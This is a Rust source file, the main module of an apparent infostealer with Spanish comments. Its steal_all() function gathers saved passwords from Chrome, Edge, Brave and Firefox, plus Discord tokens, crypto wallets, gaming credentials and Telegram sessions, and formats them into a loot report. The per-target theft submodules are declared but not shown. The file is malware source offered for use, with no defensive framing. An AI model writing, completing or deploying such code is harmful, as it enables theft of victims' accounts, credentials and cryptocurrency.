// Módulo de robo de credenciales de browsers
pub mod chromium;
pub mod firefox;
pub mod discord;
pub mod wallets;
pub mod gaming;
pub mod telegram;
pub mod common;

use std::error::Error;
use std::fmt;

#[derive(Debug)]
pub enum StealerError {
    BrowserNotFound,
    DecryptionFailed,
    DatabaseError(String),
    IoError(String),
    Base64Error,
    InvalidData,
}

impl fmt::Display for StealerError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        match self {
            StealerError::BrowserNotFound => write!(f, "Browser no encontrado"),
            StealerError::DecryptionFailed => write!(f, "Error al desencriptar"),
            StealerError::DatabaseError(e) => write!(f, "Error de base de datos: {}", e),
            StealerError::IoError(e) => write!(f, "Error de I/O: {}", e),
            StealerError::Base64Error => write!(f, "Error decodificando Base64"),
            StealerError::InvalidData => write!(f, "Datos inválidos"),
        }
    }
}

impl Error for StealerError {}

pub type StealerResult<T> = Result<T, StealerError>;

/// Credencial robada de un browser
#[derive(Debug, Clone)]
pub struct Credential {
    pub browser: String,
    pub url: String,
    pub username: String,
    pub password: String,
}

impl Credential {
    pub fn to_string(&self) -> String {
        format!(
            "[{}]\nURL: {}\nUser: {}\nPass: {}\n",
            self.browser, self.url, self.username, self.password
        )
    }
}

/// Estructura para datos robados (credenciales + tokens + wallets + gaming + telegram)
#[derive(Debug)]
pub struct StolenData {
    pub credentials: Vec<Credential>,
    pub discord_tokens: Vec<discord::DiscordToken>,
    pub wallets: Vec<wallets::WalletData>,
    pub gaming: Vec<gaming::GamingData>,
    pub telegram: Vec<telegram::TelegramSession>,
}

impl StolenData {
    pub fn new() -> Self {
        Self {
            credentials: Vec::new(),
            discord_tokens: Vec::new(),
            wallets: Vec::new(),
            gaming: Vec::new(),
            telegram: Vec::new(),
        }
    }
    
    pub fn is_empty(&self) -> bool {
        self.credentials.is_empty() && 
        self.discord_tokens.is_empty() && 
        self.wallets.is_empty() &&
        self.gaming.is_empty() &&
        self.telegram.is_empty()
    }
    
    pub fn total_count(&self) -> usize {
        self.credentials.len() + 
        self.discord_tokens.len() + 
        self.wallets.len() +
        self.gaming.len() +
        self.telegram.len()
    }
    
    pub fn to_string(&self) -> String {
        let mut output = String::new();
        
        // Credenciales de browsers
        if !self.credentials.is_empty() {
            output.push_str(&format!("\n🌐 BROWSER CREDENTIALS ({})\n", self.credentials.len()));
            output.push_str("═══════════════════════════════════════\n");
            for (idx, cred) in self.credentials.iter().enumerate() {
                output.push_str(&format!("\n[#{}] ", idx + 1));
                output.push_str(&cred.to_string());
            }
        }
        
        // Discord tokens
        if !self.discord_tokens.is_empty() {
            output.push_str(&format!("\n\n💬 DISCORD TOKENS ({})\n", self.discord_tokens.len()));
            output.push_str("═══════════════════════════════════════\n");
            for (idx, token) in self.discord_tokens.iter().enumerate() {
                output.push_str(&format!("[#{}] {}\n", idx + 1, token.to_string()));
            }
        }
        
        // Crypto Wallets
        if !self.wallets.is_empty() {
            output.push_str(&format!("\n\n💰 CRYPTO WALLETS ({})\n", self.wallets.len()));
            output.push_str("═══════════════════════════════════════\n");
            for (idx, wallet) in self.wallets.iter().enumerate() {
                output.push_str(&format!("\n[#{}] ", idx + 1));
                output.push_str(&wallet.to_string());
            }
        }
        
        // Gaming Credentials
        if !self.gaming.is_empty() {
            output.push_str(&format!("\n\n🎮 GAMING CREDENTIALS ({})\n", self.gaming.len()));
            output.push_str("═══════════════════════════════════════\n");
            for (idx, game) in self.gaming.iter().enumerate() {
                output.push_str(&format!("\n[#{}] ", idx + 1));
                output.push_str(&game.to_string());
            }
        }
        
        // Telegram Sessions
        if !self.telegram.is_empty() {
            output.push_str(&format!("\n\n💬 TELEGRAM SESSIONS ({})\n", self.telegram.len()));
            output.push_str("═══════════════════════════════════════\n");
            for (idx, session) in self.telegram.iter().enumerate() {
                output.push_str(&format!("\n[#{}] ", idx + 1));
                output.push_str(&session.to_string());
            }
        }
        
        output
    }
}

/// Ejecuta el robo de credenciales de todos los browsers y Discord
pub fn steal_all() -> StolenData {
    let mut data = StolenData::new();

    // Chromium-based browsers
    if let Ok(mut chrome_creds) = chromium::steal_chrome() {
        data.credentials.append(&mut chrome_creds);
    }
    
    if let Ok(mut edge_creds) = chromium::steal_edge() {
        data.credentials.append(&mut edge_creds);
    }
    
    if let Ok(mut brave_creds) = chromium::steal_brave() {
        data.credentials.append(&mut brave_creds);
    }

    // Firefox
    if let Ok(mut firefox_creds) = firefox::steal_firefox() {
        data.credentials.append(&mut firefox_creds);
    }
    
    // Discord tokens
    if let Ok(mut tokens) = discord::steal_discord_tokens() {
        data.discord_tokens.append(&mut tokens);
    }
    
    // Crypto Wallets
    let mut wallet_data = wallets::steal_wallets();
    data.wallets.append(&mut wallet_data);
    
    // Gaming Credentials
    let mut gaming_data = gaming::steal_gaming_data();
    data.gaming.append(&mut gaming_data);
    
    // Telegram Sessions
    let mut telegram_data = telegram::steal_telegram_sessions();
    data.telegram.append(&mut telegram_data);

    data
}
